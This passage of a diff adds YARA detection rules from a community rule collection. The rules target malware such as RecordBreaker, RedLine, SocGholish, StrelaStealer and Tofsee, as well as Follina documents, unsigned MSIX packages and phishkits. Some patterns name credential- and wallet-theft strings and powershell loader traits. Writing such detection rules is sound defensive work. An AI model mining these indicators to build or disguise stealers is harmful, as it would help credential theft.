+        yarahub_author_twitter = "@SI_FalconTeam"
+
+	strings:
+		$magic = {43 44 30 30 31} // CD001 ISO Magic
+		$tool = {55 4C 54 52 41 49 53 4F 00 39 2E 37 2E 36 2E 33 38 32 39} // "ULTRAISO.9.7.6.3829"
+
+		$msiMagic = {D0 CF 11 E0 A1 B1 1A E1}
+		$dosString = "!This program cannot be run in DOS mode" ascii // To "exclude" Office files which also use $msiMagic
+		$lnkMagic = {4C 00 00 00}
+
+	condition:
+		filesize > 200KB 
+		and filesize < 800KB 
+		and all of them
+}import "pe"
+
+rule recordbreaker_win_generic
+{
+	meta:
+		author = "_kphi"
+		date = "2022-09-10"
+		yarahub_uuid = "29b92b37-a135-4ca0-beeb-ef8401ed458f"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "38edeba93cc729b7099d74a7780d4dd6"
+
+	strings:
+		$a1 = "GetEnvironmentVariable"
+		$a2 = "GetLogicalDriveStrings"
+		$a3 = "GetSystemWow64Directory"
+		$a4 = "GlobalMemoryStatusEx"
+		$a5 = "DeleteFile"
+		$a6 = "FindFirstFile"
+		$a7 = "FindNextFile"
+		$a8 = "CreateToolhelp32Snapshot"
+		$a9 = "OpenProcess"
+		$a10 = "Process32First"
+		$a11 = "Process32Next"
+		$a12 = "SetCurrentDirectory"
+		$a13 = "SetEnvironmentVariable"
+		$a14 = "WriteFile"
+		$a15 = "ShellExecute"
+		$a16 = "CreateProcessWithToken"
+		$a17 = "DuplicateTokenEx"
+		$a18 = "OpenProcessToken"
+		$a19 = "SystemFunction036"
+		$a20 = "EnumDisplayDevices"
+		$a21 = "GetDesktopWindow"
+		$a22 = "CryptStringToBinary"
+		$a23 = "CryptStringToBinary"
+		$a24 = "CryptBinaryToString"
+		$a25 = "CryptUnprotectData"
+		$a26 = "InternetConnect"
+		$a27 = "InternetOpen"
+		$a28 = "InternetSetOption"
+		$a29 = "InternetOpenUrl"
+		$a30 = "InternetOpenUrl"
+		$a31 = "InternetReadFileEx"
+		$a32 = "InternetReadFile"
+		$a33 = "InternetCloseHandle"
+		$a34 = "HttpOpenRequest"
+		$a35 = "HttpSendRequest"
+		$a36 = "HttpQueryInfo"
+		$a37 = "HttpQueryInfo"
+
+		$b1 = "GetProcAddress"
+		$b2 = "LoadLibraryW"
+
+		$c1 = "ffcookies.txt" wide
+		$c2 = "wallet.dat" wide
+		
+	condition:
+		uint16(0) == 0x5A4D
+		and 30 of ($a*)
+		and any of ($b*)
+		and any of ($c*)
+}
+import "pe"
+
+rule redline_win_generic
+{
+	meta:
+		author = "_kphi"
+		date = "2022-09-10"
+		yarahub_uuid = "1172c6d1-7066-4ff1-9d48-c040981d43d4"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "3fdf448f17f65a9677f6597c807060f1"
+
+	strings:
+		$a = "GetCurrentProcessId"
+		$b = "GetCurrentProcessorNumber"
+		$c = "GetCurrentThread"
+		$d = "GetCurrentThreadId"
+		$e = "GetPriorityClass"
+		$f = "GetThreadPriority"
+		$g = "TerminateProcess"
+		$h = "VirtualProtect"
+
+	condition:
+		uint16(0) == 0x5A4D
+		and pe.sections[4].name == ".bss"
+		and all of them
+}
+/*
+  Yara created from diff results for ScareCrow samples. 
+*/
+rule ScareCrow_Malware
+{
+	meta: 
+		date = "2023-10-03"
+		yarahub_uuid = "40b7ba1b-fdef-4181-ad6f-7015f4467aaf"
+		yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "23ff15d2d88c243499b0e9d8d9f5445a"
+		author = "schmidtsz"
+		description = "Identify ScareCrow/GoShell samples"
+	strings:
+		$0 = {0A846E69BBC09E99F889BEEAD49C06C10D25CA43EA7006C0762C6E250A4448F128575E6A92060438CADB6457862ACD96F2ECF504370805C6BC123EED277580BC2E6833C6444A86F76B978DE87192A0EB1D21E0FB6AEEB37AA37E5831875B44936429D8BA05EA60594C9EAEFD687215B8BD338E298724B96FDF451A3D}
+		$1 = "3333333333444444444455666677777888888888889999999999"
+		$2 = {092B0C510B1D0E4E0D2810510F1D124E11291456131E164E15281857171D1A4E192B1C511B1D1E4E1D2820511F1D224E21292456231E264E25282857271D2A4E292B2C512B1D2E4E2D2830512F1D324E31293456331E364E35283857371D3A4E39BE053C573B203E553D1E404E3F284257411D444E432B4651451D484E47284A51491D4C4E4B294E564D1E504E4F285257511D544E532B5651551D584E57285A51591D5C4E5B295E565D1E604E5F286257611D644E632B6651651D684E67286A51691D6C4E6B296E566D1E704E6F287257711D744E73EB}
+		$3 = {7379102C2CD8F4536FCE8ADF995AE969E84B8A9B1B07799405C1B62BA0D89184E2DE6C82E24897F94671A436C84EB6259B1608231B1BFDB7988D4D447AE2E3F7200EE5F5F030FE727F78B06A8C6D8E35A9515E332DBDBD4F9F965C85EF08B28213E63580782CAD2347BCB3662B8BDE31CCAF2150CB3B4C76AC55}
+		$4 = {918EE7AACB34A5373E93B0ADA4B5BB273672A195FE818EC50DB81CD90DA3AAB1C3CE093B7E22F23611E6B1A7E8A50A4F3A21E6E48E5557C2CA8F9DD1624FCDE288A91F9EF22AED72BDB305863BA3801BEB93A745AF75A8CFACE0C333056630F172BC888B8D49C9016C8CB480867F7CAD8FEB6AEEF0}
+		$5 = {6B300662C1D08F6C18779889A4488F9686BC87BAF1C4B387DE94FEABCD1A333CA8AB29292EB6E0140B1D7F8BC0F09F25490BBAD9DC718CD94DE45EAEF0EC076F1B8E2810548EAF50619DF6D92CE8C94AA2B13214E971DBD25C223A081C31BE6E05AF9FAC31278906F4AA480A63BD6DCA}
+		$6 = {5C2042BD7F0E9581110584E5999C61B273A892AC1F52FAE15506E55EC0C3F99E9052B797A7E6785AEB479E76B0F45C639A93D2BE28908B18F3EC224AEE9833FC803887EE3274AEDE2FA8ABDC29BF3F3BA10629AA3F115AD63B92D653F4EE07C524A459CAC74AF865651B66B45895}
+		$7 = {6B3CE8B9DCAD0DAFA234AD6D1DD778DD854B62E853D968ADE5408C6472866BAA336F3D71D487C2181F51AFFD0E68069500CB8C8DC9A9F2DE66251BBD120248BAC0FDEFF03BD4574B60F730B64B016D7498FE9576A5842D5E3835BDA39E4188913E}
+		$8 = {20689FDB9873A6052AED82CAC268DB8C14A143893F0888433AD491BE792189B05989946B4F0A6AD44849362ED869AB1CB0AB7946E38C84099BDBC3394E44D6114E0B0C0C0ED8F2E540691AE4B0EA8595210E0F8F118E6F1F9103211D5D65A7}
+		$9 = "ESTCSTCDTMSTMDT-02EDTASTADTPSTPDTNSTNDT+06+03+04+07IST+09+08IDT+12PKT+11KST+05JST+10-"
+		$10 = "cgocallbackg1.fun"
+		$11 = "CgoTraceback.fun"
+		$12 = {50443BCF958890FEC0EF8FC6E7B9267764150A43BBAA343EF1F519DC303478CA5E4DE609B5EAE0C6967220133D41167DB6E05F4C62259978BC8FE8578CD15B1C}
+		$13 = "f ) =  <==GOGC] =  pc=: p=cas1cas2cas3cas4cas5cas6 at \n\tm= sp= sp: lr: fp=) m=icmpigm"
+  condition:
+    all of them
+}rule SelfExtractingRAR {
+  meta:
+    author = "Xavier Mertens"
+    description = "Detects an SFX archive with automatic script execution"
+    date = "2023-05-17"
+    yarahub_author_twitter = "@xme"
+    yarahub_author_email = "xmertens@isc.sans.edu"
+    yarahub_reference_link = "https://isc.sans.edu/diary/rss/29852"
+    yarahub_uuid = "bcc4ceab-0249-43af-8d2a-8a04d5c65c70"
+    yarahub_license =  "CC0 1.0"
+    yarahub_rule_matching_tlp =  "TLP:WHITE"
+    yarahub_rule_sharing_tlp =  "TLP:WHITE"
+    yarahub_reference_md5= "7792250c87624329163817277531a5ef" 
+
+    strings:
+        $exeHeader = "MZ"
+        $rarHeader = "Rar!" wide ascii
+        $sfxSignature = "SFX" wide ascii
+        $sfxSetup = "Setup=" wide ascii
+
+    condition:
+       $exeHeader at 0 and $rarHeader and $sfxSignature and $sfxSetup
+}
+rule sfx_pdb_winrar_restrict {
+
+   meta:
+      author = "@razvialex"
+      description = "Detect interesting files containing sfx with pdb paths."
+      date = "2022-07-12"
+      yarahub_author_twitter = "@razvialex"
+      yarahub_reference_md5 = "826108ccdfa62079420f7d8036244133"
+      yarahub_uuid = "8835c09d-0b29-4892-8c68-fd520de87bd6"
+      yarahub_license = "CC BY 4.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+
+   strings:
+      $var1 = {0D786FA11A6028825A871437B4A067DF66AD67D833A5F938FE6EC930FD51CEF76D711BE7F24D203888A458DFC627FBFCAC32B8D15C96EC7722BB84E4A718812C4BB7A76563E2E43413E3A98A8AE4BA7DBA019CDBF07B3D4434E69B3C6DBC46D120ABB2F78192F0674CFEF4AA8EC682B5EA7C3F995610AA1C2B60F1BA730EC29BF769CFDE5AED1FA0A2479888B08F149C38AAE726B742E5}
+      $var2 = "E<ul><li>Press <b>Install</b> button to start extraction.</li><br><br>E<ul><li>Press <b>Extract</b> button to start extraction.</li><br><br>6<li>Use <b>Browse</b> button to select the destination4folder fr" nocase ascii wide
+      $var3 = {7E2024732572D181F9B8E4AE05150740623B7A4F5DA4CE3341E24F6D6D0F21F23356E55613C12597D7EB2884EB96D3773B491EAE2D1F472038AD96D1CEFA8ADBCDDE4E86C06855A15D69B2893C122471457D100000411C274A176E57AE62ECAA8922EFDDFBA2B6E4EFE117F2BD66338088B4373E2CB8BF91DEAC190864F4D44E6AFF350E6A}
+      $var4 = {294424600F28F0660F6E5C241C660FFEF4660F6ED10F28C6660F6ECA660FEFC5660F62CA0F28E0660F72D00C660F72F414660FEFE0660F6E44242C660F62D80F28442460660F62D9660FFEDF660F6EF8660FFEDC660FEFC30F295C24500F28D8660F72D008660F72F318660FEFD80F28D3660F70DB39660FFED6}
+      $var5 = {374DC673D0676DEA06A89B51F8F203C4A2E152A03A2310D7A9738544BAD912CF031887709B3ADC52E852B2E54EFB17072FA64DBEE1D7AB0A4FED628C7BECB9CE214066D4008315A1E675E3CCF2292F848100000000E4177764FBF5D3713D76A0E92F147D664CF4332EF1B8F38E0D0F1369944C73A80F26}
+      $var6 = "lo haya hecho.\"\x0D\n\x0D\n; Dialog STARTDLG\x0D\n\x0D\n\x0D\n:DIALOG STARTDLG\x0D\n\x0D\nSIZE   " nocase ascii wide
+      $winrar = "name=\"WinRAR SFX\"\x0D\n  type=\"win32\"/>\x0D\n<description>WinRAR SFX modu" nocase ascii
+      $pdb = "Projects\\WinRAR\\sfx\\build\\sfxrar32\\Release\\sfxrar.pdb" nocase ascii
+      
+   condition:
+      $winrar and $pdb and 5 of ($var*) and filesize < 3MB 
+}import "pe"
+
+
+rule signed_sys_with_vulnerablity {
+    meta:
+		description = "signed_sys_with_vulnerablity"
+        date = "2023-07-21"
+        author ="wonderkun"
+        yarahub_reference_md5     = "3b25a34bb08f4759792c24b121109513"
+        yarahub_uuid = "615591f5-2e81-4c01-8ebf-ab8aade6efcf"
+        yarahub_license =  "CC0 1.0"
+        yarahub_rule_matching_tlp =  "TLP:WHITE"
+        yarahub_rule_sharing_tlp =  "TLP:WHITE"
+        tlp = "WHITE"
+
+    strings:
+        $MmMapIoSpace = "MmMapIoSpace"
+        $MapViewOfSection = "MapViewOfSection"
+        $PhysicalMemory = "PhysicalMemory"
+	condition:
+		(pe.imports("ntoskrnl.exe") and pe.number_of_signatures > 0)
+        and
+        ($MmMapIoSpace or $MapViewOfSection or $PhysicalMemory)
+}
+rule SocGholish_Custom_Base64 {
+
+  meta:
+      author = "Ankit Anubhav -ankitanubhav.info"
+      description = "Detects custom base64 used by SocGholish"
+      date = "2022-08-02"
+      yarahub_author_twitter = "@ankit_anubhav"
+      yarahub_author_email = "ankit.yara@inbox.ru"
+      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
+      yarahub_reference_md5 = "28b01b187ecb0bdc1301da975b52a2fa"
+      yarahub_uuid = "10fcd711-8af7-432e-89a7-ae3c109c7dc2"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      malpedia_family = "js.fakeupdates"
+
+   strings:
+       $x = "&15)<<4)|("
+       $y = { 69 6e 64 65 78 4f 66 28 ?? ?? 2e 63 68 61 72 41 74 28 ?? ?? 2b 2b 29 }
+       $z = "ABCD"
+    condition:
+       $x and #y == 4 and (not $z) and filesize > 500 and filesize < 3000
+
+
+
+}
+rule SocGholish_Obfuscated {
+
+  meta:
+      author = "Ankit Anubhav -ankitanubhav.info"
+      description = "Detects reverse obfuscated socgholish string"
+      date = "2022-06-25"
+      yarahub_author_twitter = "@ankit_anubhav"
+      yarahub_author_email = "ankit.yara@inbox.ru"
+      yarahub_reference_link = "https://twitter.com/ankit_anubhav/status/1540395958428504064"
+      yarahub_reference_md5 = "7fb296f96e098bdaaaa518c2ba176ece"
+      yarahub_uuid = "e32059b3-f685-42a7-9f45-1d977046611a"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      malpedia_family = "js.fakeupdates"
+
+   strings:
+       $x = { 70 ?? 74 ?? 74 ?? 68 }
+       $y = { 67 ?? 6e ?? 70 ?? 2e [1-3] 6c ?? 65 ?? 78 ?? 69 ?? 70 }
+       $z = { 66 ?? 69 ?? 67 ?? 2e ?? 31 ?? 78 ?? 31 }
+    condition:
+       $x and ($y or $z)  and filesize > 500 and filesize < 3000
+
+
+
+}
+rule SocGholish_Variant_B {
+
+  meta:
+      author = "Ankit Anubhav -ankitanubhav.info"
+      description = "Detects SocGholish obfuscated variant first observed in July 2022"
+      date = "2022-07-19"
+      yarahub_author_twitter = "@ankit_anubhav"
+      yarahub_author_email = "ankit.yara@inbox.ru"
+      yarahub_reference_link = "https://twitter.com/ankit_anubhav/status/1549246034831781888"
+      yarahub_reference_md5 = "4fcc9569ca63cb2f5777954ac4c9290f"
+      yarahub_uuid = "df3d194a-c6bc-4440-bad9-461e0e7962fd"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      malpedia_family = "js.fakeupdates"
+
+   strings:
+       $x = { 3d 3d }
+       $y = { 66 75 6e 63 74 69 6f 6e }
+       $z = { 72 65 74 75 72 6e }
+    
+    condition:
+       (#x > 200 and #x < 500)  and (#y > 200 and #y < 270) and (#z > 180 and #z < 190) and filesize > 37000 and filesize < 42000
+
+
+
+}
+rule sqlcmd_loader {
+    meta:
+        author = "@luc4m"
+        date = "2023-03-26"
+        hash_md5 = "6ffbbca108cfe838ca7138e381df210d"
+        link = "https://medium.com/@lcam/updates-from-the-maas-new-threats-delivered-through-nullmixer-d45defc260d1"
+        tlp = "WHITE"
+	yarahub_uuid = "06196d3f-f414-4d87-9fe4-5dd40682f89f"
+        yarahub_license =  "CC0 1.0"
+        yarahub_rule_matching_tlp =  "TLP:WHITE"
+        yarahub_rule_sharing_tlp =  "TLP:WHITE"
+        yarahub_reference_md5= "6ffbbca108cfe838ca7138e381df210d" 
+    strings:
+        $trait_0 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 ec 04 00 00}
+        $trait_1 = {85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 9f 04 00 00}
+        $trait_2 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 7d 04 00 00}
+        $trait_3 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 5b 04 00 00}
+        $trait_4 = {6a 20 59 2b d9 03 f1 03 d1 3b d9 0f 83 5f fb ff ff}
+        $trait_5 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 e3 03 00 00}
+        $trait_6 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 c1 03 00 00}
+        $trait_7 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 9f 03 00 00}
+        $trait_8 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 4c 03 00 00}
+        $trait_9 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 2a 03 00 00}
+
+ $str_0 = /debug[0-9]{1,3}\.ps1/i wide
+ $str_1 = "%s\\\\sysnative\\\\%s" wide
+ $str_2 = "/c \\\"powershell " wide
+ $str_3 = "%s/ab%d.exe" wide 
+ $str_4 = "%s/ab%d.php" wide 
+
+    condition:
+        (5 of ($trait_*)) and (3 of ($str_*))
+}
+
+import "pe"
+
+rule StrelaStealer {
+	meta:
+        author = "@hackNpatch@infosec.exchange"
+        date = "2022-11-11"
+        yarahub_author_twitter = "@hackpatch"
+        yarahub_reference_sha256 = "8b0d8651e035fcc91c39b3260c871342d1652c97b37c86f07a561828b652e907"
+		yarahub_reference_md5 = "57EC0F7CF124D1AE3B73E643A6AC1DAD"        
+		yarahub_reference_link = "https://medium.com/@DCSO_CyTec/shortandmalicious-strelastealer-aims-for-mail-credentials-a4c3e78c8abc"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_uuid = "9dbbc74b-fdf0-475f-a2df-0478ab5299e1"
+
+	strings:
+		$pdbstring = "C:\\Users\\Serhii\\Documents\\Visual Studio 2008\\Projects\\StrelaDLLCompile\\Release\\StrelaDLLCompile.pdb"
+	
+	condition:
+		pe.DLL
+		and pe.number_of_exports == 1
+		and ($pdbstring or pe.exports("s") or pe.exports("Strela"))
+
+}rule SUS_UNC_InEmail
+{
+	meta:
+		author = "Nicholas Dhaeyer - @DhaeyerWolf"
+		date = "2023-05-15"
+		description = "Looks for a suspicious UNC string in .eml files & .ole files"
+		yarahub_uuid = "7df969ed-49f8-4c52-be25-6511d6dcc37f"
+		yarahub_license = "CC BY-SA 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "1ac728095ebedb5d25bea43e69014bc4"
+	  
+	strings:
+		$MAGIC_MSG = {D0 CF 11 E0 A1 B1 1A E1} // sadly the .msg message byte is the same as the one for other OLE files
+		$MAGIC_EML = {52 65 63 65 69 76 65 64 3A} // Magic byte for .eml files: "Received:"
+		$MAGIC_ICS = {42 45 47 49 4E 3A 56 43 41 4C 45 4E 44 41 52} // "BEGIN:VCALENDAR"
+		
+		$Appointment = "IPM.Appointment"
+		
+		$UNC = {00 5C 5C} 
+	  
+	condition:
+		$UNC and ($MAGIC_MSG at 0 or $MAGIC_EML at 0 or $MAGIC_ICS at 0) and $Appointment
+}rule SUS_Unsigned_APPX_MSIX_Manifest_Feb23
+{
+	meta:
+		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+		description = "Detects suspicious Microsoft Windows APPX/MSIX Installer Manifests"
+		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
+		date = "2023-02-01"
+		tlp = "CLEAR"
+		yarahub_reference_md5 = "69660f5abb08fc430cf756a44d19e039"
+		yarahub_uuid = "06b5fba4-6b6d-41f8-9910-cce86eabbde4"
+		yarahub_license = "CC BY 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_author_twitter = "@SI_FalconTeam"
+
+	strings:
+		$xlmns = "http://schemas.microsoft.com/appx/manifest/"
+		
+		// as documented here: https://learn.microsoft.com/en-us/windows/msix/package/unsigned-package
+		$identity = "OID.2.25.311729368913984317654407730594956997722=1"
+		
+		$s_entrypoint = "EntryPoint=\"Windows.FullTrustApplication\""
+		$s_capability = "runFullTrust"
+		$s_peExt = ".exe"
+
+	condition:
+		uint32be(0x0) == 0x3C3F786D
+		and $xlmns
+		and $identity
+		and 2 of ($s*)
+}rule SUS_Unsigned_APPX_MSIX_Installer_Feb23
+{
+	meta:
+		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+		description = "Detects suspicious, unsigned Microsoft Windows APPX/MSIX Installer Packages"
+		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
+		date = "2023-02-01"
+		tlp = "CLEAR"
+		yarahub_reference_md5 = "69660f5abb08fc430cf756a44d19e039"
+		yarahub_uuid = "3eaac733-4ab9-40e1-93fe-3dbed6d458e8"
+		yarahub_license = "CC BY 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_author_twitter = "@SI_FalconTeam"
+
+	strings:
+		$s_manifest = "AppxManifest.xml"
+		$s_block = "AppxBlockMap.xml"
+		$s_peExt = ".exe"
+
+		// we are not looking for signed packages
+		$sig = "AppxSignature.p7x"
+
+	condition:
+		uint16be(0x0) == 0x504B
+		and 2 of ($s*)
+		and not $sig
+}
+rule SUSP_Doc_WordXMLRels_May22 {
+   meta:
+      description = "Detects a suspicious pattern in docx document.xml.rels file as seen in CVE-2022-30190 / Follina exploitation"
+      author = "Tobias Michalski, Christian Burkard, Wojciech Cieslak"
+      date = "2022-05-30"
+      yarahub_reference_md5 = "5f15a9b76ad6ba5229cb427ad7c7a4f6"
+      yarahub_uuid = "a9aad367-682e-440c-8732-dc414274b5c3"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+	  techniques = "File and Directory"
+      modified = "2022-06-02"
+      reference = "https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e"
+      hash = "62f262d180a5a48f89be19369a8425bec596bc6a02ed23100424930791ae3df0"
+      score = 70
+   strings:
+      $a1 = "<Relationships" ascii
+      $a2 = "TargetMode=\"External\"" ascii
+
+      $x1 = ".html!" ascii
+      $x2 = ".htm!" ascii
+   condition:
+      filesize < 50KB
+      and all of ($a*)
+      and 1 of ($x*)
+}
+
+import "pe"
+
+rule SUSP_HxD_Icon_Anomaly_May23_1 {
+   meta:
+      description = "Detects suspicious use of the the free hex editor HxD's icon in PE files that don't seem to be a legitimate version of HxD"
+      author = "Florian Roth"
+      reference = "https://www.linkedin.com/feed/update/urn:li:activity:7068631930040188929/?utm_source=share&utm_medium=member_ios"
+
+      date = "2023-05-30"
+      yarahub_uuid = "b70e448c-b1c3-4edd-a109-e9bc5122a2ab"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      yarahub_reference_md5 = "21e13f2cb269defeae5e1d09887d47bb"
+
+   strings:
+      /* part of the icon bitmap : we're not using resource hashes etc because YARA's string matching is much faster */
+      $ac1 = { 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80
+               99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80
+               99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80
+               99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80
+               99 00 77 0D DD 09 99 80 99 00 77 0D D0 99 98 09
+               99 99 00 0D D0 99 98 09 99 99 00 0D D0 99 98 09
+               99 99 00 0D D0 99 98 0F F9 99 00 0D D0 99 98 09
+               9F 99 00 0D D0 99 98 09 FF 99 00 0D D0 99 98 09
+               FF 99 00 0D D0 99 98 09 99 99 00 0D D0 99 98 0F
+               F9 99 00 0D D0 99 98 09 99 99 00 0D 09 99 80 9F
+               F9 99 99 00 09 99 80 99 F9 99 99 00 09 99 80 FF }
+      $ac2 = { FF FF FF FF FF FF FF FF FF FF FF FF FF FF B9 DE
+               FA 68 B8 F4 39 A2 F1 39 A2 F1 39 A2 F1 39 A2 F1
+               39 A2 F1 39 A2 F1 68 B8 F4 B9 DE FA FF FF FF FF
+               FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF }
+
+      /* strings to expect in a HxD executable */
+      $s1 = { 00 4D 00 61 00 EB 00 6C 00 20 00 48 00 F6 00 72 00 7A } /* Developer: Maael Hoerz */
+      $s2 = "mh-nexus.de" ascii wide
+
+      /* UPX marker */
+      $upx1 = "UPX0" ascii fullword
+
+      /* Keywords that are known to appear in malicious  samples */
+      $xs1 = "terminator" ascii wide fullword // https://www.linkedin.com/feed/update/urn:li:activity:7068631930040188929/?utm_source=share&utm_medium=member_ios
+      $xs2 = "Terminator" ascii wide fullword // https://www.linkedin.com/feed/update/urn:li:activity:7068631930040188929/?utm_source=share&utm_medium=member_ios
+   condition:
+      // HxD indicators
+      uint16(0) == 0x5a4d 
+      and 1 of ($ac*)
+      // Anomalies
+      and (
+         not 1 of ($s*) // not one of the expected strings
+         or filesize > 6930000 // no legitimate sample bigger than 6.6MB
+         // all legitimate binaries have a known size and shouldn't be smaller than ...
+         or ( pe.is_32bit() and filesize < 1540000 and not $upx1 )
+         or ( pe.is_32bit() and filesize < 590000 and $upx1 )
+         or ( pe.is_64bit() and filesize < 6670000 and not $upx1 )
+         or ( pe.is_64bit() and filesize < 1300000 and $upx1 )
+         // keywords expected in malicious samples
+         or 1 of ($xs*)
+      )
+}rule SUSP_ZIP_LNK_PhishAttachment {
+    meta:
+        description = "Detects suspicius tiny ZIP files with malicious lnk files"
+        author = "ignacior"
+        reference = "Internal Research"
+        date = "2022-06-23"
+        score = 50
+        yarahub_uuid = "fbb7c8e8-55b6-4192-877b-3dbaad76e12e"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "a457d941f930f29840dc8219796e35bd"
+    strings:
+        $sl1 = ".lnk"
+    condition:
+		uint16(0) == 0x4b50 and filesize < 2KB and $sl1 in (filesize-256..filesize)
+}
+rule SVCReady_Packed
+{
+    meta:
+        author                    = "Andre Gironda"
+        date                      = "2022-06-08"
+        description               = "packed SVCReady / win.svcready"
+        hash                      = "326d50895323302d3abaa782d5c9e89e7ee70c3a4fbd5e49624b49027af30cc5"
+        hash2                     = "76d69ec491c0711f6cc60fbafcabf095"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "andreg@gmail.com"
+        yarahub_author_twitter    = "@AndreGironda"
+        yarahub_license           = "CC0 1.0"
+        yarahub_reference_md5     = "76d69ec491c0711f6cc60fbafcabf095"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "db8e2535-efef-4ada-a67f-919970546b1e"
+   strings:
+        $hex_1003b3e0 = { 52 75 6e 50 45 44 6c 6c 4e 61 74 69 76 65 3a 3a 46 69 6c 65 20 68 61 73 20 6e 6f 20 72 65 6c 6f 63 61 74 69 6f 6e }
+        $hex_1003b424 = { 50 61 79 6c 6f 61 64 20 64 65 70 6c 6f 79 6d 65 6e 74 20 66 61 69 6c 65 64 2c 20 73 74 6f 70 70 69 6e 67 }
+        $hex_1003c234 = { 4e 6f 74 20 73 75 70 70 6f 72 74 65 64 20 72 65 6c 6f 63 61 74 69 6f 6e 73 20 66 6f 72 6d 61 74 20 61 74 20 25 64 3a 20 25 64 0a 00 5b 2d 5d 20 }
+        $hex_1003c2cc = { 49 6e 76 61 6c 69 64 20 61 64 64 72 65 73 73 20 6f 66 20 72 65 6c 6f 63 61 74 69 6f 6e 73 20 62 6c 6f 63 6b }
+   condition:
+        all of them
+}
+rule tofsee_yhub {
+    meta:
+        date = "2022-10-23"
+        yarahub_uuid = "a2863cf2-6b6e-42e4-b78a-7e3fe72659ce"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "92e466525e810b79ae23eac344a52027"
+        yarahub_author_twitter = "@billyaustintx"
+        author = "Billy Austin"
+        description = "Detects Tofsee botnet, also known as Gheg"
+        malpedia_family = "Tofsee"
+    strings:
+        $s1 = "Too many errors in the block" ascii
+        $s2 = "%OUTLOOK_BND_" ascii
+        $s3 = "no locks and using MX is disabled" ascii
+        $s4 = "mx connect error" ascii
+        $s5 = "Too big smtp respons" ascii
+        $s6 = "INSERT_ORIGINAL_EMAIL" ascii
+        $s7 = "integr_nl = %d" ascii
+        $s8 = "mail.ru" ascii
+        $s9 = "smtp_herr" ascii
+        $s10 = "%OUTLOOK_MID" ascii
+
+    condition:
+        uint16(0) == 0x5a4d and filesize < 200KB and 7 of ($s*)
+}rule unk_phishkit {
+	meta:
+		author = "James E.C, Proofpoint"
+		description = "Unknown phishkit"
+		date = "2022-07-06"
+		yarahub_uuid = "c6d0afdc-2d5e-4674-bca0-5e6738c22bca"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "7639fdbeac0f75cbcbd9b623a8a6b0d6"
+	strings:
+		$hp1 = "function validateMyForm()" ascii
+		$hp2 = ".getElementById(\"honeypot\").value" ascii
+
+		$kit1 = /<form action=\"[A-Za-z0-9]{2,8}\.php\"/
+		$kit2 = "onSubmit=\"return validateMyForm();" ascii
